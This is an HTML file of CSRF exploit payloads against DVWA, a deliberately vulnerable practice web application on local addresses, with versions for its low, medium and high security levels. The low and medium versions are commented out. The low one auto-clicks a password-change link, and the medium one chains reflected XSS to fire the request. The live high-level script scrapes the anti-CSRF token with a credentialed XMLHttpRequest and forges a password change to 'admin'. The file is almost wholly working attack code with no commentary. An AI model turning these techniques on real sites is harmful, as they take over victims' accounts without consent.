
<!-- Works for low -->

<!--
<body onload="document.querySelector('a').click();">


	<a href="http://192.168.0.104/dvwa/vulnerabilities/csrf/?password_new=termite&password_conf=termite&Change=Change">lol</a>


</body> 
-->

<!-- low -->


<!-- Should work for Medium -->

<!--
<body onload="document.forms[0].submit()">

	<form action="http://192.168.0.104/dvwa/vulnerabilities/xss_r/" method="GET">
	
		<input type="hidden" name="name" value="<img src='http://192.168.0.104/dvwa/vulnerabilities/csrf/?password_new=dumbell&password_conf=dumbell&Change=Change'">

		<input type="submit">Submit</input>

	</form>

</body>

-->

<!-- medium -->


<!-- Should work for High -->

<script>
    /**
     * Author hd7exploit
     */
    var theUrl = 'http://192.168.0.106/dvwa/vulnerabilities/csrf/';
    var pass = 'admin';
    if (window.XMLHttpRequest){
        xmlhttp=new XMLHttpRequest();
    }else{
        xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
    }
    xmlhttp.withCredentials = true;
    var hacked = false;
    xmlhttp.onreadystatechange=function(){
        if (xmlhttp.readyState==4 && xmlhttp.status==200)
        {
            var text = xmlhttp.responseText;
            var regex = /user_token\' value\=\'(.*?)\' \/\>/;
            var match = text.match(regex);
            var token = match[1];
            var new_url = 'http://192.168.0.106/dvwa/vulnerabilities/csrf/?user_token='+token+'&password_new='+pass+'&password_conf='+pass+'&Change=Change'
            if(!hacked){
                alert('Got token:' + match[1]);
                hacked = true;
                xmlhttp.open("GET", new_url, false );
                xmlhttp.send();  
            }
        }
    };
    xmlhttp.open("GET", theUrl, false );
    xmlhttp.send();  
            
</script>
lel

<!-- high -->
